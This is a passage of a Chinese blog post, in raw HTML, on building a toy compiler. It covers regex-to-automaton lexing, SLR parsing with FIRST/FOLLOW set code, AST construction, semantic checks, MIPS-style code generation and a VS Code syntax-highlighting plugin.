class="hljs">&lt;ul&gt;&lt;li&gt;正则&lt;/li&gt;&lt;li&gt;todo&lt;/li&gt;&lt;/ul&gt;</code></pre><li>sematic</li><ul><li>slr</li><li>语义分析</li><li>todo</li></ul><li>代码生成</li><li>可视化</li><h2 id="二parser">二、parser</h2><p>在词法分析阶段，输入是字符串，输出是 token 流，这里 token流有一个坑，一开始我的输出是枚举值的数组，类似这样:<code>[TYPE, ID, BRACE, ...]</code>，但是这样会有问题，因为词素值没办法保留下来，所以后面改成了如下输出:<code>[(line_num, TYPE, int), (line_num, ID, feb)]</code>，(行号，类型,词素值)三元组 学过编译原理都知道，需要有自动机把输入流，转成一个个token，比如当词法分析器读完 int 的时候，这时候就会返回一个 TYPEtoken，但是如果是 int1，就应该返回一个 IDtoken，所以这里涉及到贪婪读取，另外对于像 if这种关键字，如果同时满足多种终结状态，应该涉及到优先级</p><p>那么如何构建自动机？ 首先我们的目标是对每种特定的 token设置对应的正则表达式，并生成对应的 dfa，用过 flex的同学应该都知道，比如：</p><p>然后我们把这些 dfa 构建为一个大的 nfa，再把 nfa 转为 dfa</p><p>我们的词法分析器支持以下几个单元： +: a+, ?: a?, <em>: a</em>, 连接:ab， 逻辑或: a|b， 字符集: [a-z] 支持少部分字符转义：, t, </p><p>如何把正则表达式构建为dfa：对于每一个单元正则表达式，可以直接生成对应的节点，但是有些问题我们需要注意：我们的输入是一个个正则表达式，正则表达式本身可以理解为是一个个单元，而这些单元又可能是字符或者其他单元和成的，如：a|b 就是一个单元，但是其组成就是 2 个字符 [a-z]|a就是一个单元+一个普通字符另外对于中括号这种还需要特殊处理，思路如下：即使是字符也会抽象成节点的概念，另外在生成自动机的过程中，由于存在[]，+，*等等这样的修饰符号，考虑使用stack 进行存储，一般的，形式化如下：对于正则表达式 xxxxx 其中 X为可能的任意字符，<code>stack = []</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">i = <span class="hljs-number">0</span><br>pattern = <span class="hljs-string">&#x27;XXXX&#x27;</span><br><span class="hljs-keyword">while</span> (i &lt; len(pattern)) &#123;<br>  <span class="hljs-keyword">auto</span> node = getNode(pattern[i]);<br>  <span class="hljs-built_in">stack</span>.push(node);<br>&#125;<br><br>node <span class="hljs-title function_">getNode</span><span class="hljs-params">(<span class="hljs-built_in">string</span> s)</span> &#123;<br>  <span class="hljs-keyword">if</span> (s === <span class="hljs-string">&#x27;]&#x27;</span>)<br>  <span class="hljs-keyword">if</span> (s === <span class="hljs-string">&#x27;+&#x27;</span>)<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>其中 getNode函数做的事请就是识别特定的符号，然后用对应的正则表达式函数生成即可，比如对于特殊的符号:[],需要收集其包含的字符集，然后构建一个如图的基本正则单元；再比如a+，我们需要从 stack 内 pop 出一个元素，生成对应的基本正则单元。</p><p>最后，所有的特殊符号处理完成，也就意味着栈内只有正则表达式单元这种数据结构，这些节点之间没有任何修饰符(因为修饰符之前都被处理完了，除了连接运算)，然后我们依次连接这些节点即可，另外对于每个正则的叶子节点确定，即当前栈顶元素的最后一个节点(因为栈顶元素对应正则的末尾)。</p><p>我们可以提供相应的函数，我们的词法分析器包含以下几种基本正则单元：</p><ol type="1"><li>连接运算符</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs node">export function connect(from: VertexNode, to: VertexNode): VertexNode &#123;<br>  // from的尾和to的头相互连接,注意circle<br>  let cur = graph.getVertex(from.index); // 获取邻接表<br>  const memo: number[] = [];<br>  while (cur.firstEdge &amp;&amp; !memo.includes(cur.index)) &#123;<br>    memo.push(cur.index);<br>    cur = graph.getVertex(cur.firstEdge.index);<br>  &#125;<br><br>  graph.getVertex(cur.index).firstEdge = new Node(<br>    to.index,<br>    graph.getVertex(cur.index).firstEdge<br>  );<br>  return from;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>逻辑或</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs node">export function or(a: VertexNode, b: VertexNode): VertexNode &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  nodeStart.firstEdge = new Node(a.index, null, a.edgeVal || null);<br>  nodeStart.firstEdge.next = new Node(b.index, null, b.edgeVal || null);<br>  const nodeEnd = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeEnd, nodeEnd.index);<br>  connect(a, nodeEnd);<br>  connect(b, nodeEnd);<br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>字符集</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs node">export function characters(chars: string[]) &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  const nodeEnd = new Node(Graph.node_id, null, chars);<br>  const tmp = new VertexNode(nodeEnd.index, chars);<br>  graph.addVertexNode(tmp, tmp.index);<br><br>  const pre = nodeStart.firstEdge;<br>  nodeStart.firstEdge = nodeEnd;<br>  nodeEnd.next = pre;<br><br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4" type="1"><li>*修饰符</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs node">export function mutipliy(wrapped: VertexNode): VertexNode &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  const tmp = new Node(wrapped.index, null, null);<br>  nodeStart.firstEdge = tmp;<br>  let cur = graph.getVertex(wrapped.index); // 获取邻接表<br>  while (cur.firstEdge) &#123;<br>    cur = graph.getVertex(cur.firstEdge.index);<br>  &#125;<br>  connect(cur, nodeStart);<br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5" type="1"><li>+修饰符</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs node">export function plus(base: VertexNode) &#123;<br>  // 基于old新建节点<br>  let nodeStart = new VertexNode(Graph.node_id, base.edgeVal);<br>  nodeStart.firstEdge = base.firstEdge;<br>  const res = nodeStart;<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  let cur = base?.firstEdge;<br>  while (cur) &#123;<br>    const vertexNode = graph.getVertex(cur?.index);<br>    const tmp = new VertexNode(Graph.node_id, vertexNode.edgeVal);<br>    nodeStart.firstEdge = new Node(tmp.index, null, vertexNode.edgeVal);<br>    nodeStart = tmp;<br>    tmp.firstEdge = base.firstEdge;<br>    graph.addVertexNode(tmp, tmp.index);<br>    cur = vertexNode.firstEdge;<br>  &#125;<br>  return mutipliy(res);<br>&#125;<br></code></pre></td></tr></table></figure><p>不过比较困扰的是这些节点的数据结构如何存储是一件要考虑周到的事：需要节点id，由于自动机是有向图，并且可能带环，并且节点和节点之间可能存在不止一条边，考虑了下，还是用linjie表存储(主要是第一版的代码是这样的，再加上如果感觉节点之间的连接可能在某些情况下比较少，临界矩阵比较浪费内存)，firstEdge指向其所有的临界边，edgeVal 是边上的值，对于该图的搜索，使用bfs+dfs+检测环。 通过以上流程，我们得到了一个 nfa，由该 nfa可以得到各个节点的边，以及叶子节点(并且叶子节点上放置了相应的动作)</p><p>nfa =&gt; dfa:这一步使用的是虎书上的算法，这里不过多描述，简单来说就是把很多个大的 nfa联合构建成一个 dfa 从而得到一张状态转移表</p><h2 id="三构建抽象语法树">三、构建抽象语法树</h2><p>这里我用的是简单的LR(0)上下无关文法，关于什么是上下无关文什么是有关文，请戳-&gt;,理论上上下无关文法LR(1) &gt; LSPR &gt; SLR &gt; LR(0) LR(0): 没有提前预测的符号，容易出现shift-reduce 冲突以及 reduce-reduce 冲突，所以需要设计适合的文法； SLR:有简单的预测，可以解决 shift-reduce 冲突，但是无法解决 reduce-reduce冲突 LR(1): 可以解决 shift-reduce 冲突，也解决 reduce-reduce 冲突 LSPR:由于 LR(1)的表特别大，在此基础上做了优化</p><p>根据相应文法生成 ast，本质上是利用栈和 nfa，看如下文法的LR(0)生成过程： E-&gt; Program $ Program -&gt; Assign == Assign Assign-&gt; Assign + Token Assign -&gt; Token Token -&gt; id</p><p>LR(0)dfa</p><p><img src="../飞书20230430-125517.jpg" /></p><p>LR(0)对应的状态转移表： <img src="../飞书20230430-124728.jpg" /></p><p>可以看到在状态 9 是存在移位-规约冲突的，这是因为LR(0)默认在所有的终结符号处做规约，slr 语法是比LR(0),更为广泛的一种语法，它只在特定的地方放置规约动作。具体来说，在上面的例子里，在状态9 处，只有规约式 1 的移位指针到达里末尾，所以可以看下规约式 1后面可能会紧接着什么符号，也就是 followSet(Program) ={$}，所以只在$处放置规约动作。 下面是 slr 分析表： <imgsrc="../飞书20230430-163301.jpg" /></p><p>有了这张表就可以基于输入(一般是 token流)去做语法分析了，刷过算法题的都应该猜到了会用栈来作为数据结果，是的，每一次自底向上规约都可以看作是栈的pop动作，并且在这次动作中可以做很多事情，比如生成我们想要的树节点，如：</p><p>在设计 AST 结构的同时需要同时兼顾到 AST的结构方便语义分析和代码生成，该语言的 ast 结构大致如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs node">Program_Class &#123;<br>  expr: Function_Class &#123;<br>    formal_list: [ &#x27;x&#x27; ],<br>    name: &#x27;total&#x27;,<br>    expressions: Branch_Class &#123;<br>      ifCond: Cond_Class &#123;<br>        lExpr: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>        rExpr: Int_Contant_Class &#123; token: &#x27;0&#x27; &#125;,<br>        op: &#x27;==&#x27;<br>      &#125;,<br>      statementTrue: Return_Class &#123; expr: Indentifier_Class &#123; token: &#x27;x&#x27; &#125; &#125;,<br>      statementFalse: Assign_Class &#123;<br>        name: &#x27;m&#x27;,<br>        ltype: &#x27;int&#x27;,<br>        r: Caller_Class &#123;<br>          params_list: [ undefined ],<br>          id: &#x27;total&#x27;,<br>          params: Sub_Class &#123;<br>            lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            rvalue: Int_Contant_Class &#123; token: &#x27;1&#x27; &#125;<br>          &#125;,<br>          next: undefined<br>        &#125;,<br>        next: Return_Class &#123;<br>          expr: Add_Class &#123;<br>            lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            rvalue: Indentifier_Class &#123; token: &#x27;m&#x27; &#125;<br>          &#125;<br>        &#125;<br>      &#125;<br>    &#125;,<br>    formals: Formal_Class &#123; name: &#x27;x&#x27;, type: &#x27;int&#x27;, next: undefined &#125;,<br>    next: Function_Class &#123;<br>      formal_list: [ &#x27;x&#x27;, &#x27;y&#x27; ],<br>      name: &#x27;sum&#x27;,<br>      expressions: Return_Class &#123;<br>        expr: Add_Class &#123;<br>          lvalue: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>          rvalue: Indentifier_Class &#123; token: &#x27;y&#x27; &#125;<br>        &#125;<br>      &#125;,<br>      formals: Formal_Class &#123;<br>        name: &#x27;y&#x27;,<br>        type: &#x27;int&#x27;,<br>        next: Formal_Class &#123; name: &#x27;x&#x27;, type: &#x27;int&#x27;, next: undefined &#125;<br>      &#125;,<br>      next: Function_Class &#123;<br>        formal_list: [],<br>        name: &#x27;main&#x27;,<br>        expressions: Assign_Class &#123;<br>          name: &#x27;x&#x27;,<br>          ltype: &#x27;int&#x27;,<br>          r: Caller_Class &#123;<br>            params_list: [ &#x27;10&#x27; ],<br>            id: &#x27;total&#x27;,<br>            params: Int_Contant_Class &#123; token: &#x27;10&#x27; &#125;,<br>            next: undefined<br>          &#125;,<br>          next: Caller_Class &#123;<br>            params_list: [ &#x27;x&#x27; ],<br>            id: &#x27;print&#x27;,<br>            params: Indentifier_Class &#123; token: &#x27;x&#x27; &#125;,<br>            next: undefined<br>          &#125;<br>        &#125;,<br>        formals: undefined,<br>        next: undefined,<br>        return_type: &#x27;int&#x27;<br>      &#125;,<br>      return_type: &#x27;int&#x27;<br>    &#125;,<br>    return_type: &#x27;int&#x27;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其树节点是各种表达式类，源码在 tree.ts 文件里，</p><p>follow集和first集生成： follow集： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs node">_processFollow(_nts: string) &#123;<br>  // 3 若存在一个表达式 X -&gt; ABCD 则 Follow(A) 需要加上 First(B) - ε，若First(B) 包含 ε，则Follow(A) 需要加上 First(C) - ε，向右迭代... 迭代至表达式结束。<br>  for (const nts of this.nonTerminalSymbol) &#123;<br>    for (let grammarArr of this.lfh2rfh.get(nts)) &#123;<br>    <br>      const len = grammarArr.value.length;<br>      let index = -1;<br>      // 找到 B<br>      for (let i = 0; i &lt; len; i += 1) &#123;<br>        const ch = grammarArr.value[i];<br>        if (ch === _nts) &#123;<br>          index = i;<br>          break;<br>        &#125;<br>      &#125;<br>      if (index === -1) continue;<br>      while (index + 1 &lt; len) &#123;<br>        const ch = grammarArr.value[index + 1];<br>        if (this.terminalSymbol.has(ch)) &#123;<br>          // 终结符直接加入<br>          this._followSet[_nts].add(ch);<br>          break;<br>        &#125; else &#123;<br>          const set = this._firstSet[ch];<br>          for (const v of Array.from(set || []))<br>            if (v !== EMPTY) this._followSet[_nts].add(v);<br>          if (!set?.has(EMPTY)) break;<br>          index += 1;<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br>startBuildFollowSet() &#123;<br>  for (let nts of this.nonTerminalSymbol) &#123;<br>    this._followSet[nts] = new Set();<br>  &#125;<br>  this._followSet[START].add(END);<br>  while (true) &#123;<br>    let flag = false;<br>    for (let nts of this.nonTerminalSymbol) &#123;<br>      this._processFollow(nts);<br>      if (isEqual(prevFollowSet, this._followSet)) flag = true;<br>      else flag = false;<br>      prevFollowSet = cloneDeep(this._followSet);<br>    &#125;<br>    if (flag) break;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs node">// 求firset集这里做了点改动，一般需要手动消除左递归文法，这里在代码里如果遇到了左递归直接结束<br>_processFirst(nts: string, memo: Set&lt;string&gt;) &#123;<br>  memo.add(nts);<br>  for (const grammarArr of this.lfh2rfh.get(nts)) &#123;<br>    const len = grammarArr.value.length;<br>    for (let i = 0; i &lt; len; i += 1) &#123;<br>      const ch = grammarArr.value[i];<br>      if (this.terminalSymbol.has(ch)) &#123;<br>        this._firstSet[nts].add(ch);<br>        break;<br>      &#125; else &#123;<br>        if (i === 0 &amp;&amp; ch === nts) &#123;<br>          // 避免左递归<br>          break;<br>        &#125;<br>        if (memo.has(ch)) &#123;<br>          // 避免循环递归<br>          break;<br>        &#125;<br>        <br>        this._processFirst(ch, memo);<br>        for (const v of this._firstSet[ch]) this._firstSet[nts].add(v);<br>        if (!this._firstSet[ch].has(EMPTY)) break;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br>startuildFirstSet() &#123;<br>  for (let nts of this.nonTerminalSymbol) this._firstSet[nts] = new Set();<br>  for (let nts of this.nonTerminalSymbol) &#123;<br>    const memo = new Set([]);<br>    this._processFirst(nts, memo);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="五ast生成">五、AST生成</h2><p>如下所示，在提前定义好的文法产生式做对应的规约动作，如下case0就是<code>Formals -&gt; int,TOKEN.ID</code>，在这里利用栈内的元素生成Formal_Class；就这样每次在对应的文法产生式上对对应的做规约动作，从而完成自底向上的ast的构建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs node">[Formals -&gt; int, TOKEN.ID]: 0,<br>[Formals -&gt; Formals, &#x27;,&#x27;, int, TOKEN.ID]: 1<br><br>case 0:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2]);<br>  break;<br>case 1:<br>  res = new Formal_Class(yyvalsp[0][2], yyvalsp[1][2], yyvalsp[3]);<br>  break;<br><br></code></pre></td></tr></table></figure><h2 id="六语义分析">六、语义分析</h2><p>在语义分析阶段可以做类型检查和基本的校验，这里放置了一些基本的类型检查动作：1. 必须要有main函数，main函数的返回值必须是整形 2.其他函数的返回值和实际返回值类型对应 3. 赋值语句左右两侧类型一致 4.同一个作用域不得出现同名变量 5. 变量必须先声明并初始化才能使用</p><h2 id="七汇编代码生成">七、汇编代码生成</h2><p>思路：自上向下进行利用堆栈机代码生成，仅使用了3个寄存器，a0，v0，t0，其中v0是辅助寄存器帮助函数返回值存储以及系统调用的退出和打印；总结了下，最重要的点是对声明变量的内存分配以及取变量的时候，要知道对应的作用域链，该从哪个作用取，只要我们对基本的一些单元表达式做好了代码生成的工作，后面就是搭积木的工作了；下面是该语言的函数栈示意图：<img src="../飞书20230502-104729.jpg" /></p><p>这里如何取参数？由于函数栈在扩增的时候，不太方便通过sp指针获取参数和变量的存储位置，所以这里使用fp指针去作为基地址，寻找参数和局部变量</p><p>关于作用域问题是采用的树结构存储(双向链表)，每次从当前所在作用域内寻找变量，再继续依次向上寻找，直到找到函数级作用域；</p><p>以下是具体的几个单元表达式生成的例子：</p><p>a + b lw $a0 局部 or 参数 / li $a0, imm sw $a0, 0($29) addiu $29,$29, -4 lw $a0 局部 or 参数 / li $a0, imm add $a0, $t0, $a0</p><p>对于int x = 2，直接用li命令存储，并在函数的局部变量处向函数栈内放置元素; 对于int x = a + b,先利用a+b元表达式生成对应的代码，再用lw指令存储单元表达式的值，</p><h2 id="八编写代码高亮语法插件">八、编写代码高亮语法插件：</h2><p>我这里是速成版，比较简单，只涉及简单的语法部分 需要安装：<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ npm <span class="hljs-keyword">install</span> -g vsce<br>$ npm <span class="hljs-keyword">install</span> -g yo<br></code></pre></td></tr></table></figure></p><p>如果是需要编写全新的插件，则允许： yo code 选择 new LanguageSupport，提示一些问题，按需填写即可，插件名称尽可能唯一，不然在插件市场里不好搜，运行完命令之后会有一个生成目录，编写高亮语法的文件在xxx.tmLanguage.json 文件里，如果你只是配置一个 VS Code中已有语言的语法，记得删掉生成的 package.json 中的 languages 配置。</p><p>https://www.bookstack.cn/read/VS-Code-Extension-Doc-ZH/docs-language-extensions-syntax-highlight-guide.md#fu57uu(编写插件vscode)</p><p>这里看下我的规则：</p><p>以及vscode里的settings.json文件： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;editor.tokenColorCustomizations&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;[Default Dark+]&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-comment">// 这里是自己所选择的主题颜色，我的是vscode默认的颜色</span><br>    <span class="hljs-attr">&quot;textMateRules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;identifier.name&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 自定义或者符合标准规范的命名，对应插件里的xxx.tmLanguage.json文件里的name选项</span><br>        <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#33ba8f&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;id.name.mc&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>          <span class="hljs-attr">&quot;foreground&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#eb8328&quot;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>xxx.tmLanguage.json里的配置： <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;$schema&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://raw.githubusercontent.com/martinring/tmlanguage/master/tmlanguage.json&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;minic&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#keywords&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#type&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#number&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#id&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;#comment&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;repository&quot;</span><span class="hljs-punctuation">:</span> <span 